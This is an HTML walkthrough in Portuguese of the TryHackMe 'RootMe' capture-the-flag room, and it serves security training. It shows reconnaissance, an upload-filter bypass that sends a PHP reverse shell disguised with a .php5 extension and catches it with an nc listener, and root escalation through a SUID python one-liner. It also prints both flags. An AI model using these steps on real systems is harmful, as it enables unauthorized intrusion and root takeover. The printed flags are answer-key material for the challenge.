<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>RootMe - Walkthrough</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        
        body {
            background-color: #f0f8ff;
            color: #333;
            line-height: 1.6;
            padding: 20px;
        }
        
        .container {
            max-width: 1200px;
            margin: 0 auto;
        }
        
        header {
            text-align: center;
            margin-bottom: 40px;
            padding: 30px;
            background: linear-gradient(135deg, #115192 0%, #0a4b8f 100%);
            border-radius: 12px;
            color: white;
            box-shadow: 0 6px 12px rgba(0, 0, 0, 0.15);
        }
        
        h1 {
            font-size: 2.8rem;
            margin-bottom: 15px;
            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.2);
        }
        
        .subtitle {
            font-size: 1.2rem;
            opacity: 0.9;
        }
        
        h2 {
            color: #115192;
            margin: 35px 0 20px;
            padding-bottom: 10px;
            border-bottom: 2px solid #115192;
        }
        
        h3 {
            color: #0a4b8f;
            margin: 15px 0 10px;
        }
        
        p {
            margin-bottom: 15px;
        }
        
        .intro {
            background-color: white;
            padding: 25px;
            border-radius: 10px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.08);
            margin-bottom: 40px;
            line-height: 1.8;
        }
        
        .cards-container {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(320px, 1fr));
            gap: 25px;
            margin-bottom: 40px;
        }
        
        .card {
            background: linear-gradient(145deg, #ffffff, #f5f9ff);
            border-radius: 12px;
            box-shadow: 0 8px 16px rgba(0, 0, 0, 0.1);
            padding: 25px;
            transition: all 0.3s ease;
            border-top: 5px solid #115192;
            position: relative;
            overflow: hidden;
        }
        
        .card::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 4px;
            background: linear-gradient(90deg, #115192, #0a4b8f);
        }
        
        .card:hover {
            transform: translateY(-8px);
            box-shadow: 0 12px 20px rgba(0, 0, 0, 0.15);
        }
        
        .card-header {
            display: flex;
            align-items: center;
            margin-bottom: 15px;
        }
        
        .card-icon {
            width: 50px;
            height: 50px;
            background: linear-gradient(135deg, #115192, #0a4b8f);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin-right: 15px;
            color: white;
            font-size: 1.5rem;
        }
        
        .card h3 {
            color: #115192;
            margin: 0;
            font-size: 1.4rem;
        }
        
        .card-content {
            color: #444;
            line-height: 1.6;
        }
        
        .highlight {
            background-color: #e8f4ff;
            padding: 12px 15px;
            border-radius: 8px;
            margin: 15px 0;
            border-left: 4px solid #115192;
            font-size: 0.95rem;
        }
        
        .highlight code {
            background: #2d2d2d;
            color: #f8f8f2;
            padding: 2px 6px;
            border-radius: 4px;
            font-family: monospace;
        }
        
        .section {
            background: linear-gradient(to right, #e8f4ff, #f0f8ff);
            padding: 25px;
            border-radius: 12px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.08);
            margin: 40px 0;
            border-left: 5px solid #115192;
        }
        
        .code {
            background-color: #2d2d2d;
            color: #f8f8f2;
            padding: 18px;
            border-radius: 8px;
            margin: 20px 0;
            overflow-x: auto;
            font-family: 'Fira Code', monospace;
            font-size: 0.95rem;
            line-height: 1.5;
            border-left: 4px solid #115192;
        }
        
        .command {
            background-color: #2d2d2d;
            color: #f8f8f2;
            padding: 12px 15px;
            border-radius: 6px;
            margin: 10px 0;
            font-family: 'Fira Code', monospace;
            font-size: 0.95rem;
            display: flex;
            align-items: center;
        }
        
        .command-prefix {
            color: #50fa7b;
            margin-right: 10px;
        }
        
        .example-link {
            display: inline-block;
            background: #115192;
            color: white;
            padding: 10px 20px;
            border-radius: 6px;
            text-decoration: none;
            margin: 10px 0;
            transition: background 0.3s;
        }
        
        .example-link:hover {
            background: #0a4b8f;
        }
        
        footer {
            text-align: center;
            margin-top: 50px;
            padding: 25px;
            color: #666;
            font-size: 0.95rem;
            border-top: 1px solid #ddd;
        }
        
        ul, ol {
            margin-left: 20px;
            margin-bottom: 15px;
        }
        
        li {
            margin-bottom: 8px;
        }
        
        .image-container {
            width: 100%;
            margin: 20px 0;
            border-radius: 8px;
            overflow: hidden;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
            border: 2px solid #115192;
        }
        
        .image-container img {
            width: 100%;
            display: block;
            transition: transform 0.3s ease;
        }
        
        .image-container:hover img {
            transform: scale(1.02);
        }
        
        .image-caption {
            background: #115192;
            color: white;
            padding: 10px;
            text-align: center;
            font-size: 0.9rem;
        }
        
        .step {
            background-color: white;
            padding: 20px;
            border-radius: 8px;
            margin: 20px 0;
            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
        }
        
        .step-number {
            background-color: #115192;
            color: white;
            width: 40px;
            height: 40px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-weight: bold;
            margin-right: 15px;
        }
        
        .step-header {
            display: flex;
            align-items: center;
            margin-bottom: 15px;
        }
        
        table {
            width: 100%;
            border-collapse: collapse;
            margin: 20px 0;
            background-color: white;
            border-radius: 8px;
            overflow: hidden;
            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
        }
        
        th, td {
            padding: 12px 15px;
            text-align: left;
            border-bottom: 1px solid #ddd;
        }
        
        th {
            background-color: #115192;
            color: white;
        }
        
        tr:hover {
            background-color: #f5f9ff;
        }
        
        @media (max-width: 768px) {
            .cards-container {
                grid-template-columns: 1fr;
            }
            
            header {
                padding: 20px;
            }
            
            h1 {
                font-size: 2.2rem;
            }
            
            .image-container {
                margin: 15px 0;
            }
        }
    </style>
</head>
<body>
    <a href="../CTF.php"><?php include('../seta.php'); ?></a>
    <div class="container">
        <header>
            <h1>ROOTME</h1>
            <p class="subtitle">Walkthrough da sala do TryHackMe</p>
        </header>
        
        <section class="intro">
            <h2>Sala RootMe</h2>
            <p>Esta é uma sala de CTF (Capture The Flag) do TryHackMe focada em exploração de vulnerabilidades de upload de arquivos e escalação de privilégios. O objetivo é explorar vulnerabilidades e obter acesso root ao sistema.</p>
            
            <a href="https://tryhackme.com/room/rootme" target="_blank" class="example-link">
                <i class="fas fa-external-link-alt"></i> Acessar Sala no TryHackMe
            </a>
            
            <div class="highlight">
                <strong>Nota:</strong> Esta sala ensina técnicas de exploração de upload de arquivos, bypass de restrições e escalação de privilégios usando binários SUID.
            </div>
        </section>
        
        <section class="section">
            <h2>Reconhecimento Inicial</h2>
            
            <div class="step">
                <div class="step-header">
                    <div class="step-number">1</div>
                    <h3>Escaneamento de Portas</h3>
                </div>
                <p>Primeiro, realize um escaneamento de portas para identificar serviços disponíveis:</p>
                <div class="code">
                    nmap -sV 10.10.154.57
                </div>
                
                <div class="highlight">
                    <strong>Resultado do escaneamento:</strong>
                    <ul>
                        <li>Porta 22/tcp: SSH - OpenSSH 7.6p1 Ubuntu</li>
                        <li>Porta 80/tcp: HTTP - Apache httpd 2.4.29 (Ubuntu)</li>
                    </ul>
                </div>
                
                <p>O resultado mostra dois serviços principais: SSH na porta 22 e um servidor web Apache na porta 80.</p>
            </div>
            
            <div class="step">
                <div class="step-header">
                    <div class="step-number">2</div>
                    <h3>Enumeração de Diretórios</h3>
                </div>
                <p>Use o Gobuster para encontrar diretórios e arquivos ocultos no servidor web:</p>
                
                <div class="code">
                    gobuster dir -u http://10.10.154.57/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
                </div>
                
                <div class="highlight">
                    <strong>Resultado da enumeração:</strong>
                    <ul>
                        <li>/uploads (Status: 301)</li>
                        <li>/css (Status: 301)</li>
                        <li>/js (Status: 301)</li>
                        <li>/panel (Status: 301)</li>
                    </ul>
                </div>
                
                <p>O diretório <code>/uploads</code> e <code>/panel</code> são particularmente interessantes para investigação.</p>
            </div>
        </section>
        
        <section class="section">
            <h2>Exploração de Upload de Arquivos</h2>
            
            <div class="step">
                <div class="step-header">
                    <div class="step-number">3</div>
                    <h3>Investigando o Painel de Upload</h3>
                </div>
                <p>Ao acessar o diretório <code>/panel</code>, encontramos um formulário de upload de arquivos:</p>
                
                <div class="highlight">
                    <strong>Restrição encontrada:</strong> O sistema bloqueia uploads de arquivos com extensão .php.
                </div>
                
                <p>Esta restrição pode ser contornada usando extensões alternativas como .php5 que foi a que eu utilizei</p>
            </div>
            
            <div class="step">
                <div class="step-header">
                    <div class="step-number">4</div>
                    <h3>Restrição de Upload</h3>
                </div>
                <p>baixe um shell reverse</p>
                <p>e para contornar a restrição, renomeie o arquivo PHP para usar uma extensão alternativa:</p>
                
                <div class="code">
                    # Renomear o arquivo reverse shell
                    mv php-reverse-shell.php php-reverse-shell.php5
                </div>
                
                <div class="highlight">
                    <strong>Upload bem-sucedido:</strong> O arquivo php-reverse-shell.php5 foi enviado com sucesso para o servidor.
                </div>
                
                <p>O arquivo é armazenado no diretório <code>/uploads</code> que foi descoberto durante a enumeração.</p>
            </div>
            
            <div class="step">
                <div class="step-header">
                    <div class="step-number">5</div>
                    <h3>Obtendo Shell Reverso</h3>
                </div>
                <p>Configure um listener na sua máquina e execute o arquivo enviado:</p>
                
                <div class="code">
                    nc -nlvp 4444
                    
                    # Acessar no navegador:
                    http://10.10.154.57/uploads/php-reverse-shell.php5
                </div>
                
                <div class="highlight">
                    <strong>Conexão reversa estabelecida:</strong> Shell reverso obtido com sucesso.
                </div>
                
                <p>Agora com acesso ao sistema como o usuário www-data.</p>
            </div>
        </section>
        
        <section class="section">
            <h2>Primeira Flag</h2>
            
            <div class="step">
                <div class="step-header">
                    <div class="step-number">6</div>
                    <h3>Exploração do Sistema</h3>
                </div>
                <p>Com acesso ao sistema, procure pela flag de usuário:</p>
                
                <div class="code">
                    ls -la /home <br>
                    ls -la /var/www <br>
                    cat user.txt
                </div>
                
                <div class="highlight">
                    <strong>Flag de usuário encontrada:</strong> A primeira flag geralmente está no diretório home do usuário. THM{y0u_g0t_a_sh3ll}
                </div>
            </div>
        </section>
        
        <section class="section">
            <h2>Escalação de Privilégios</h2>
            
            <div class="step">
                <div class="step-header">
                    <div class="step-number">7</div>
                    <h3>Identificando Binários SUID</h3>
                </div>
                <p>Para escalar privilégios, procure por binários com bit SUID configurado:</p>
                
                <div class="code">
                    find / -user root -perm -4000 2>/dev/null
                </div>
                
                <div class="highlight">
                    <strong>Explicação do comando:</strong>
                    <ul>
                        <li><code>-user root</code>: Arquivos pertencentes ao root</li>
                        <li><code>-perm -4000</code>: Arquivos com bit SUID ativo</li>
                        <li><code>2>/dev/null</code>: Suprime mensagens de erro</li>
                    </ul>
                </div>
                
                <p>Dentre os arquivos, o de python chama a atenção pois O Python se estiver com bit SUID e for executada como root, você pode usar ela para: Abrir uma shell interativa como root, modificar arquivos do sistema, criar ou alterar usuários, etc</p>
            </div>
            
            <div class="step">
                <div class="step-header">
                    <div class="step-number">8</div>
                    <h3>Explorando o Binário Python SUID</h3>
                </div>
                <p>Use o GTFOBins para explorar o binário Python com permissões SUID:</p><a href="https://gtfobins.github.io/gtfobins/python/">link</a>
                
                <div class="code">
                    ./python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
                    
                    /usr/bin/python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
                </div>
                
                <div class="highlight">
                    <strong>Escalação de privilégios bem-sucedida:</strong> Agora você tem acesso como root.
                </div>
                
                <p>O parâmetro <code>-p</code> no shell preserva as permissões privilegiadas.</p>
            </div>
            
            <div class="step">
                <div class="step-header">
                    <div class="step-number">9</div>
                    <h3>Obtendo a Flag de Root</h3>
                </div>
                <p>Com acesso root, procure pela flag final:</p>
                
                <div class="code">
                    cd root <br>
                    ls <br>
                    cat root.txt
                </div>
                
                <div class="highlight">
                    <strong>Flag de root capturada:</strong> THM{pr1v1l3g3_3sc4l4t10n}
                </div>
            </div>
        </section>
        
        <section class="section">
            <h2>Comandos e Técnicas Utilizadas</h2>
            
            <table>
                <tr>
                    <th>Comando/Técnica</th>
                    <th>Descrição</th>
                    <th>Propósito</th>
                </tr>
                <tr>
                    <td><code>nmap -sV</code></td>
                    <td>Escaneamento de versões de serviços</td>
                    <td>Identificar serviços em execução</td>
                </tr>
                <tr>
                    <td><code>gobuster dir</code></td>
                    <td>Enumeração de diretórios web</td>
                    <td>Encontrar paths ocultos</td>
                </tr>
                <tr>
                    <td>Upload de arquivo PHP</td>
                    <td>Exploração de vulnerabilidade de upload</td>
                    <td>Obter shell reverso</td>
                </tr>
                <tr>
                    <td><code>find / -perm /4000</code></td>
                    <td>Busca por binários SUID</td>
                    <td>Identificar vetores de escalação</td>
                </tr>
                <tr>
                    <td><code>python -c</code></td>
                    <td>Exploração de binário SUID</td>
                    <td>Escalar privilégios para root</td>
                </tr>
            </table>
        </section>
        
        <section class="section">
            <h2>Resumo da Exploração</h2>
            
            <div class="cards-container">
                <div class="card">
                    <div class="card-header">
                        <div class="card-icon">
                            <i class="fas fa-search"></i>
                        </div>
                        <h3>Reconhecimento</h3>
                    </div>
                    <div class="card-content">
                        <p>Escaneamento de portas e enumeração de diretórios revelaram serviços web e caminhos críticos.</p>
                    </div>
                </div>
                
                <div class="card">
                    <div class="card-header">
                        <div class="card-icon">
                            <i class="fas fa-upload"></i>
                        </div>
                        <h3>Exploração</h3>
                    </div>
                    <div class="card-content">
                        <p>Vulnerabilidade de upload de arquivos explorada com bypass de extensão para obter shell reverso.</p>
                    </div>
                </div>
                
                <div class="card">
                    <div class="card-header">
                        <div class="card-icon">
                            <i class="fas fa-crown"></i>
                        </div>
                        <h3>Escalação</h3>
                    </div>
                    <div class="card-content">
                        <p>Binário Python com SUID explorado para obter privilégios de root e capturar a flag final.</p>
                    </div>
                </div>
            </div>
            
        </section>
        
        <footer>
            <p>RootMe do TryHackMe </p>
        </footer>
    </div>
</body>
</html>